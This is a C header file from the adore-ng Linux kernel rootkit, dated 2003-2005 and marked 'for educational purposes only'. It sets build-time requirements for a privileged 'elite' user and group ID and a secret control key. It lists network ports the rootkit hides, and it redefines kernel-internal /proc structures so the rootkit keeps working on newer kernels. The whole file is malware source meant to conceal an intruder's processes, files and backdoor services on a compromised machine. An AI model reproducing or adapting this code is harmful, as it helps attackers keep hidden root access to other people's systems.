/*** (C) 2003-2005 by Stealth -- http://stealth.7350.org
 ***	
 ***
 *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
 *** SO YOU USE THIS AT YOUR OWN RISK!
 *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 ***	-> Use ava to get all the things workin'.
 ***
 *** Greets fly out to all my friends. You know who you are. :)
 *** Special thanks to Shivan for granting root access to his
 *** SMP box for adore-development. More thx to skyper for also
 *** granting root access.
 ***
 ***/
#ifndef __ADORE_NG_H__
#define __ADORE_NG_H__

/* to check whether request is legal */
#define PF_AUTH 0x1000000

#ifndef ELITE_UID
#error "No ELITE_UID given!"
#endif

#ifndef ELITE_GID
#error "No ELITE_GID given!"
#endif

#ifndef ADORE_KEY
#error "No ADORE_KEY given!"
#endif

#define ADORE_VERSION CURRENT_ADORE

/* Very old kernels don't have an equivalent macro... */
#define LinuxVersionCode(v, p, s) (((v)<<16)+((p)<<8)+(s))

u_short HIDDEN_SERVICES[] = 
	{2222, 7350, 9099, 0};

/* END CHANGE SECTION */

struct task_struct *adore_find_task(pid_t);

int adore_atoi(const char *);
extern struct module *module_list;

#if defined LINUX26 || REDHAT9
#undef for_each_task
#define for_each_task for_each_process
#endif

/* This probably does not exactly belong to the kernel version but
 * also to the GCC version used. Change here if it does not work
 */ 
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,16)
//#define MODIFY_PAGE_TABLES
#undef MODIFY_PAGE_TABLES
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 18, 0)
/* Structure for kernel workaround. */
union proc_op {
	int (*proc_get_link)(struct dentry *, struct path *);
	int (*proc_show)(struct seq_file *m,
		struct pid_namespace *ns, struct pid *pid,
		struct task_struct *task);
};

struct proc_inode {
	struct pid *pid;
	unsigned int fd;
	union proc_op op;
	struct proc_dir_entry *pde;
	struct ctl_table_header *sysctl;
	struct ctl_table *sysctl_entry;
	struct hlist_node sysctl_inodes;
	const struct proc_ns_operations *ns_ops;
	struct inode vfs_inode;
};

struct proc_dir_entry {
	/*
	 * number of callers into module in progress;l
	 * negative -> it's going away RSN
	 */
	atomic_t in_use;
	refcount_t refcnt;
	struct list_head pde_openers;	/* who did ->open, but not ->release */
	/* protects ->pde_openers and all struct pde_opener instances */
	spinlock_t pde_unload_lock;
	struct completion *pde_unload_completion;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	union {
		const struct seq_operations *seq_ops;
		int (*single_show)(struct seq_file *, void *);
	};
};

/* General functions for kernel workaround. */
static inline struct proc_inode *PROC_I(const struct inode *inode)
{
	return container_of(inode, struct proc_inode, vfs_inode);
}

static inline struct proc_dir_entry *PDE(const struct inode *inode)
{
	return PROC_I(inode)->pde;
}
#endif



#endif /* __ADORE_NG_H__ */
